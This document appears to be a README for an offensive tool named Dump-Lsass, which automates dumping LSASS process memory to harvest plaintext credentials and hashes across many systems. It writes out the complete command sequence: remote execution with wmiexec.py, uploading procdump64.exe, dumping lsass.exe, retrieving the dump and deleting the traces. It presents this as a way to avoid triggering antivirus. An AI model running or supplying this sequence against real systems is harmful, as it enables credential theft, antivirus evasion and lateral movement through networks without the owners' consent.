# Dump-Lsass
Automates the manual process of using wmiexec and procdump to dump Lsass and plaintext creds or hashes across a large number of systems.

To dump lsass.exe process memory without triggering antivirus, I would normally use Impacket wmiexec.py and procdump64.exe as follows:

```
wmiexec.py domain/user@target
put procdump64.exe
procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp
get lsass.dmp
del lsass.dmp
del procdump64.exe
exit
```
That's a very manual and time-consuming process when multiplied by many target hosts.
